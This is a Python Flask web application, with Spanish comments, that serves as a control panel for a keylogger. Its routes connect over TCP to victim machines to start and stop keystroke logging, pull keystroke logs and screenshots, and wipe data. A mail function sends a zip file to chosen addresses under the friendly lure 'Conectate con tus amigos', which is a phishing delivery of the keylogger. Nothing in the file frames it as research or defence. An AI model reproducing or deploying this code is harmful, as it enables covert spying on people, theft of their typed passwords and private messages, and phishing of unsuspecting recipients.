from flask import Flask, render_template, redirect, url_for, request, jsonify
import socket
import os
import datetime
import smtplib
from email.message import EmailMessage
from dotenv import load_dotenv

app = Flask(__name__)

# Config
SERVER_PORT = 4444
BUFFER_SIZE = 4096
UPLOAD_FOLDER = "static/uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def send_command(ip, command):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, SERVER_PORT))
            s.sendall(command.encode())
            if command.startswith("GET_IMAGE"):
                # Esperar datos binarios (lee hasta que el servidor cierre)
                data = b""
                while True:
                    packet = s.recv(BUFFER_SIZE)
                    if not packet:
                        break
                    data += packet
                return data  # Ya no .decode()
            elif command.startswith("GET_LOG"):
                return s.recv(BUFFER_SIZE * 10).decode(errors="ignore")
            return s.recv(BUFFER_SIZE).decode(errors="ignore")
    except Exception as e:
        return f"Error: {str(e)}"
    


load_dotenv()

def enviar_exe_por_correo(destinatario, archivo_path):
    try:
        email_sender = os.getenv("EMAIL_SENDER")
        email_password = os.getenv("EMAIL_PASSWORD")

        msg = EmailMessage()
        msg["Subject"] = "Conectate con tus amigos"
        msg["From"] = email_sender
        msg["To"] = destinatario
        msg.set_content("Tus amigos quieren que veas esto")

        with open(archivo_path, "rb") as f:
            exe_data = f.read()
            msg.add_attachment(exe_data, maintype="application", subtype="octet-stream", filename=os.path.basename(archivo_path))

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(email_sender, email_password)
            smtp.send_message(msg)

        return "Correo enviado correctamente."
    except Exception as e:
        return f"Error al enviar correo: {str(e)}"

@app.route("/screenshot", methods=["POST"])
def screenshot():
    ip = request.form.get("ip")
    response = send_command(ip, "GET_IMAGE")

    ip_folder = os.path.join(UPLOAD_FOLDER, ip.replace('.', '_'))
    os.makedirs(ip_folder, exist_ok=True)

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot_{timestamp}.png"
    full_path = os.path.join(ip_folder, filename)

    with open(full_path, "wb") as f:
        f.write(response)

    print("[DEBUG] Guardada:", full_path)
    print("[DEBUG] Nombre enviado:", filename)

    return render_template("keylogger.html", ip=ip, nombre=filename)


@app.route("/")
def index():
    return render_template("keylogger.html")

@app.route("/keylogger")
def keylogger():
    return render_template("keylogger.html")

@app.route("/stop", methods=["POST"])
def stop():
    ip = request.form.get("ip")
    response = send_command(ip, "STOP")
    return render_template("keylogger.html", ip=ip, response=response)

@app.route("/send_keylogger", methods=["POST"])
def send_keylogger():
    correo = request.form.get("correo")
    ruta_exe = "static/amigos.zip"  # Ajusta si está en otra ruta

    mensaje = enviar_exe_por_correo(correo or numero, ruta_exe)
    return render_template("keylogger.html", mensaje=mensaje)

@app.route("/connect", methods=["POST"])
def connect():
    ip = request.form.get("ip")
    response = send_command(ip, "PING")
    return render_template("keylogger.html", ip=ip, response=response)

@app.route("/start", methods=["POST"])
def start():
    ip = request.form.get("ip")
    response = send_command(ip, "START")
    return render_template("keylogger.html", ip=ip, response=response)

@app.route("/view_logs", methods=["POST"])
def view_logs():
    ip = request.form.get("ip")
    response = send_command(ip, "GET_LOG")
    return render_template("keylogger.html", ip=ip, log=response)

@app.route("/delete", methods=["POST"])
def delete():
    ip = request.form.get("ip")
    response = send_command(ip, "DELETE_ALL")
    return render_template("keylogger.html", ip=ip, response=response)

if __name__ == "__main__":
    app.run(debug=True, port=5050)
